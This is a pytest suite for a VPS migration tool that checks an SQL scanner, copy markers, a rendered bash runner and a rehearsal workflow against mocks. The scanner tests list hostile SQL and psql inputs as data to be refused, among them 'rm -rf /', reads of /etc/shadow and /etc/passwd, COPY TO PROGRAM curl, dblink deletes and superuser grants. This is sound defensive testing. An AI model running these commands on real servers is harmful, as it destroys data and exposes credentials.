"""US3: sqlscan (T024), copies (T023), runner (T025), rehearsal flow (T026)."""

from datetime import UTC, datetime

import pytest

from tests.conftest import call
from tests.unit.migration.conftest import SCRIPT, SQL
from vps_mcp.errors import VpsMcpError
from vps_mcp.migration import copies, runner, sqlscan

# ---------------------------------------------------------------- sqlscan


@pytest.mark.parametrize(
    "sql",
    [
        "\\c other_db\nDELETE FROM x;",
        "  \\connect prod\n",
        "\\! rm -rf /\n",
        "select 1 \\g |cat /etc/shadow\n",
        "SELECT * FROM dblink('dbname=prod', 'delete from x');",
        "CREATE EXTENSION dblink;",
        "COPY x TO PROGRAM 'curl evil';",
        "copy x from '/etc/passwd';",
        "ALTER SYSTEM SET fsync = off;",
        "DROP DATABASE shop_17;",
        "alter role odoo superuser;",
        "GRANT ALL ON x TO public;",
        "select pg_read_file('/etc/shadow');",
        "CREATE FUNCTION f() RETURNS int LANGUAGE plpython3u AS $$ import os $$;",
        "DO $$ BEGIN EXECUTE 'drop database x'; PERFORM 1; END $$;",
        "select pg_terminate_backend(123);",
    ],
)
def test_sqlscan_refuses(sql):
    assert sqlscan.scan(sql), sql


@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM res_partner WHERE active = false;\nUPDATE ir_ui_view SET active = false "
        "WHERE id IN (SELECT id FROM x);",
        "-- \\c other is just a comment\nselect 1;",
        "/* drop database x */ select 'grant all; dblink' as note;",
        "\\echo starting cleanup\n\\set ON_ERROR_STOP on\nDELETE FROM mail_message WHERE x;",
        "COPY tmp FROM STDIN;\n",
        "UPDATE res_users SET grant_id = 1;",
    ],
)
def test_sqlscan_allows(sql):
    assert sqlscan.scan(sql) == [], sqlscan.scan(sql)


# ---------------------------------------------------------------- copies


def test_copy_name_and_marker(rt):
    name = copies.copy_name("shop_17", datetime(2026, 11, 11, 12, 30, tzinfo=UTC), "ab12")
    assert name == "vmcp_shop_17_202611111230_ab12"
    key = copies.marker_key(rt)
    m = copies.make_marker(key, "cpy_1", name)
    assert m.startswith("vps-mcp-copy:cpy_1:") and len(m.split(":")[-1]) == 32
    assert copies.verify_marker(key, "cpy_1", name, m)
    assert not copies.verify_marker(key, "cpy_1", name + "x", m)
    assert not copies.verify_marker(key, "cpy_1", name, m[:-1] + ("1" if m[-1] == "0" else "0"))
    assert not copies.verify_marker(key, "cpy_1", name, None)


def test_method_choice():
    assert copies.choose_method("auto", 0) == "template"
    assert copies.choose_method("auto", 3) == "dump"
    with pytest.raises(VpsMcpError) as e:
        copies.choose_method("template", 1)
    assert e.value.category.value == "conflict"


async def test_disk_guard(rt, mvps):
    mvps.pg.disk_free = 14 * 1024**3  # today's VPS
    with pytest.raises(VpsMcpError) as e:
        await copies.disk_plan(rt, int(8.5 * 1024**3))
    assert e.value.category.value == "insufficient_disk"
    mvps.pg.disk_free = 100 * 1024**3
    plan = await copies.disk_plan(rt, 8 * 1024**3)
    assert plan["est_copy_bytes"] == int(8 * 1024**3 * 1.3)
    assert plan["min_free_bytes"] == 20 * 1024**3  # 10% of 200 GB > 10 GB


# ---------------------------------------------------------------- runner render


def _render(rt, method="template"):
    pipe = rt.settings.get_pipeline("core")
    return runner.render(
        rehearsal_id="rhs_x",
        pipeline=pipe,
        settings=rt.settings,
        source="shop_17",
        copy="vmcp_shop_17_202611111230_ab12",
        owner="odoo",
        method=method,
        marker="vps-mcp-copy:cpy_1:abc",
        file_shas={SQL: "a" * 64, SCRIPT: "b" * 64},
        watch=["shop_17", "shop_19"],
        min_free=10,
        old_major="17",
    )


def test_runner_golden(rt):
    files, sha = _render(rt)
    assert set(files) == {"run.sh", "step-1.sh", "step-2.sh", "step-3.sh", "step-4.sh"}
    assert sha == _render(rt)[1]  # stable
    copy = "vmcp_shop_17_202611111230_ab12"
    assert f"psql -X -p 5435 -d {copy} -v ON_ERROR_STOP=1 -f {SQL}" in files["step-1.sh"]
    assert (
        f"DB={copy}" in files["step-2.sh"] and "PSQL='runuser -u postgres --" in files["step-2.sh"]
    )
    s3 = files["step-3.sh"]
    assert f"-d {copy} '--db-filter=^{copy}$' --db_port=5435" in s3 and "-u all" in s3
    assert "--stop-after-init" in s3 and "runuser -u odoo --" in s3
    s4 = files["step-4.sh"]
    import shlex

    stale_sql = (
        "SELECT coalesce(string_agg(name, ',' ORDER BY name), '') FROM ir_module_module "
        "WHERE state IN ('installed','to upgrade') "
        "AND split_part(latest_version, '.', 1) = '17'"
    )
    assert "for round in $(seq 1 2)" in s4 and f"-c {shlex.quote(stale_sql)}" in s4
    run = files["run.sh"]
    assert f"createdb -p 5435 -T shop_17 -O odoo {copy}" in run
    assert "COMMENT ON DATABASE :\"copy\" IS :'marker';" in run
    counters = next(ln for ln in run.splitlines() if ln.startswith("counters()"))
    assert any("IN ('shop_17','shop_19')" in tok for tok in shlex.split(counters))
    assert sum(ln.startswith("run_step ") for ln in run.splitlines()) == 4
    assert "timeout --kill-after=60" in run and "free_ok" in run
    # changing a fingerprint changes the runner hash
    pipe = rt.settings.get_pipeline("core")
    _, other = runner.render(
        rehearsal_id="rhs_x",
        pipeline=pipe,
        settings=rt.settings,
        source="shop_17",
        copy=copy,
        owner="odoo",
        method="template",
        marker="vps-mcp-copy:cpy_1:abc",
        file_shas={SQL: "c" * 64, SCRIPT: "b" * 64},
        watch=["shop_17", "shop_19"],
        min_free=10,
        old_major="17",
    )
    assert other != sha


def test_runner_dump_mode(rt):
    files, _ = _render(rt, "dump")
    assert "pg_dump -p 5435 -Fc shop_17 | pg_restore -p 5435 -d" in files["run.sh"]


def test_parse_events():
    text = (
        "1 RUN started\n2 COPY started\n3 COPY ok\n4 STEP 1 running\n5 STEP 1 ok 0\n"
        "6 STEP 2 running\n7 STEP 2 failed 3\n8 FOREIGN 2 shop_19 5 attributed\n"
        "9 RUN foreign_write\n"
    )
    p = runner.parse_events(text, 4)
    assert p["final"] == "foreign_write" and p["copy"] == "ok"
    assert [s["status"] for s in p["steps"]] == ["ok", "failed", "not_run", "not_run"]
    assert p["steps"][1]["exit_code"] == 3
    assert p["foreign"] == [{"step": 2, "database": "shop_19", "writes": 5, "attributed": True}]


def test_runner_executes_under_bash(rt, tmp_path):
    """Run the rendered run.sh with stub binaries: statuses, disk abort, fingerprint check."""
    import os
    import subprocess

    files, _ = _render(rt)
    rdir = tmp_path / "r"
    rdir.mkdir()
    stub = tmp_path / "bin"
    stub.mkdir()
    sql_file = tmp_path / "cleanup.sql"
    sql_file.write_text("select 1;")
    import hashlib

    real_sha = hashlib.sha256(sql_file.read_bytes()).hexdigest()
    run = files["run.sh"].replace("DIR=/var/lib/vps-mcp/rehearsals/rhs_x", f"DIR={rdir}")
    run = run.replace(SQL, str(sql_file)).replace("a" * 64, real_sha)
    run = run.replace(f"{SCRIPT} {'b' * 64}", "'' ''")
    (rdir / "run.sh").write_text(run)
    for n in range(1, 5):
        (rdir / f"step-{n}.sh").write_text("exit 0\n" if n != 3 else "echo boom; exit 7\n")
    stubs = {
        "runuser": '#!/bin/bash\nshift 2\n[ "$1" = -- ] && shift\nexec "$@"\n',
        "psql": "#!/bin/bash\ncase \"$*\" in *pg_stat_database*) echo 'shop_17 100 0';; esac\nexit 0\n",
        "createdb": "#!/bin/bash\nexit 0\n",
        "dropdb": "#!/bin/bash\nexit 0\n",
        "df": "#!/bin/bash\necho Avail; echo ${FREE:-999999999}\n",
        "install": '#!/bin/bash\nfor a; do d=$a; done; mkdir -p "$d"\n',
        "sleep": "#!/bin/bash\nexit 0\n",
    }
    for name, body in stubs.items():
        p = stub / name
        p.write_text(body)
        p.chmod(0o755)
    env = {**os.environ, "PATH": f"{stub}:{os.environ['PATH']}"}
    subprocess.run(["bash", str(rdir / "run.sh")], env=env, check=True, timeout=60)
    p = runner.parse_events((rdir / "events.log").read_text(), 4)
    assert p["final"] == "failed"
    assert [s["status"] for s in p["steps"]] == ["ok", "ok", "failed", "not_run"]
    assert p["steps"][2]["exit_code"] == 7
    # disk abort before copying
    (rdir / "events.log").unlink()
    subprocess.run(["bash", str(rdir / "run.sh")], env={**env, "FREE": "1"}, check=True, timeout=60)
    assert runner.parse_events((rdir / "events.log").read_text(), 4)["final"] == "aborted_disk"
    # fingerprint changed between plan and run
    (rdir / "events.log").unlink()
    sql_file.write_text("select 2; -- edited after the plan")
    subprocess.run(["bash", str(rdir / "run.sh")], env=env, check=True, timeout=60)
    p = runner.parse_events((rdir / "events.log").read_text(), 4)
    assert p["steps"][0]["reason"] == "fingerprint_changed" and p["final"] == "failed"


# ---------------------------------------------------------------- full flow


async def plan_and_confirm(mclient, **kw):
    pv = await call(mclient, "rehearse", pipeline="core", source="shop_17", confirm=False, **kw)
    assert pv["outcome"] == "preview", pv
    st = await call(
        mclient,
        "rehearse",
        pipeline="core",
        source="shop_17",
        confirm=True,
        plan_hash=pv["plan_hash"],
        **kw,
    )
    return pv, st


async def test_preview_creates_nothing(mclient, mvps):
    pv = await call(mclient, "rehearse", pipeline="core", source="shop_17", confirm=False)
    plan = pv["plan"]
    assert plan["method"] == "template" and plan["copy_name"].startswith("vmcp_shop_17_")
    assert [s["guarantee"] for s in plan["steps"]] == ["bound", "detected", "bound", "bound"]
    assert plan["steps"][0]["sha256"] and len(plan["runner_sha256"]) == 64
    assert plan["free_bytes_after"] == plan["free_bytes_before"] - plan["est_copy_bytes"]
    assert mvps.pg.pg_mutations() == [] and mvps.pg.units == {}


async def test_full_rehearsal_success(mclient, mvps):
    def odoo(db, pg, kind):
        if kind == "all":
            for m in db.modules.values():
                if m["version"]:
                    m["version"] = m["version"].replace("17.", "19.", 1)
        return 0

    mvps.pg.odoo_effect = odoo
    pv, st = await plan_and_confirm(mclient)
    assert st["outcome"] == "success" and st["status"] == "copying"
    s = await call(mclient, "rehearsal_status")
    assert s["status"] == "succeeded", s
    assert [x["status"] for x in s["steps"]] == ["ok", "ok", "ok", "ok"]
    assert s["copy"]["state"] == "ready" and s["report"]["verdict"] in (
        "safe_to_promote",
        "review_warnings",
    )
    copy = pv["plan"]["copy_name"]
    assert mvps.pg.dbs[copy].modules["base"]["version"].startswith("19.")
    assert mvps.pg.dbs["shop_17"].modules["base"]["version"].startswith("17.")
    # nothing but the copy was touched
    assert {d for d, _ in mvps.pg.mutations} == {copy}
    timers = [u for u in mvps.pg.units if u.startswith("vps-mcp-expire-")]
    assert len(timers) == 1
    listed = await call(mclient, "db_list")
    assert [c["name"] for c in listed["copies"]] == [copy]
    # analysis works on the copy too
    ov = await call(mclient, "db_overview", db=copy)
    assert ov["modules"]["by_major"] == {"19": 2}


async def test_failed_step_stops_and_reports(mclient, mvps):
    mvps.pg.script_effects[SCRIPT] = lambda db, pg: 3
    _, st = await plan_and_confirm(mclient)
    s = await call(mclient, "rehearsal_status", rehearsal_id=st["rehearsal_id"])
    assert s["status"] == "failed"
    assert [x["status"] for x in s["steps"]] == ["ok", "failed", "not_run", "not_run"]
    assert s["steps"][1]["log_tail"]
    assert s["report"]["verdict"] == "do_not_promote"
    assert any(f["category"] == "step_failed" for f in s["report"]["top_findings"])
    assert mvps.pg.pg_mutations("shop_17") == []


async def test_foreign_write_detected(mclient, mvps):
    def evil(db, pg):
        pg.mutate("shop_19", "rogue script wrote here")
        return 0

    mvps.pg.script_effects[SCRIPT] = evil
    _, st = await plan_and_confirm(mclient)
    s = await call(mclient, "rehearsal_status")
    assert s["status"] == "foreign_write"
    cats = {f["category"]: f["severity"] for f in s["report"]["top_findings"]}
    assert cats["foreign_write"] == "blocking"


async def test_plan_hash_rules(mclient, mvps):
    bad = await call(
        mclient,
        "rehearse",
        pipeline="core",
        source="shop_17",
        confirm=True,
        plan_hash="deadbeefdeadbeef",
    )
    assert bad["error"]["category"] == "conflict" and "plan_hash" in bad
    pv = await call(mclient, "rehearse", pipeline="core", source="shop_17", confirm=False)
    mvps.files[SQL] += "-- edited after preview\n"
    changed = await call(
        mclient,
        "rehearse",
        pipeline="core",
        source="shop_17",
        confirm=True,
        plan_hash=pv["plan_hash"],
    )
    assert changed["error"]["category"] == "conflict"
    assert changed["plan_hash"] != pv["plan_hash"]
    assert mvps.pg.units == {}


async def test_concurrency_and_cancel(mclient, mvps):
    mvps.pg.run_runner_synchronously = False
    pv, st = await plan_and_confirm(mclient)
    rid = st["rehearsal_id"]
    pv2 = await call(mclient, "rehearse", pipeline="core", source="shop_19", confirm=False)
    second = await call(
        mclient,
        "rehearse",
        pipeline="core",
        source="shop_19",
        confirm=True,
        plan_hash=pv2["plan_hash"],
    )
    assert second["error"]["category"] == "conflict"
    c = await call(mclient, "cancel_rehearsal", rehearsal_id=rid, confirm=False)
    assert c["outcome"] == "preview" and c["copy_kept"] is True
    c = await call(mclient, "cancel_rehearsal", rehearsal_id=rid, confirm=True)
    assert c["status"] == "cancelled"
    s = await call(mclient, "rehearsal_status", rehearsal_id=rid)
    assert s["status"] == "cancelled"


async def test_refusals(mclient, mvps):
    mvps.pg.disk_free = 14 * 1024**3
    r = await call(mclient, "rehearse", pipeline="core", source="shop_17", confirm=False)
    assert r["error"]["category"] == "insufficient_disk"
    mvps.pg.disk_free = 100 * 1024**3
    mvps.files[SQL] = "\\c shop_19\nDELETE FROM res_partner;\n"
    r = await call(mclient, "rehearse", pipeline="core", source="shop_17", confirm=False)
    assert r["error"]["category"] == "invalid_input" and "\\c" in r["error"]["message"]
    r = await call(mclient, "rehearse", pipeline="core", source="secret_db", confirm=False)
    assert r["error"]["category"] == "not_permitted"
    r = await call(mclient, "rehearse", pipeline="nope", source="shop_17", confirm=False)
    assert r["error"]["category"] == "not_found"
    assert mvps.pg.pg_mutations() == []
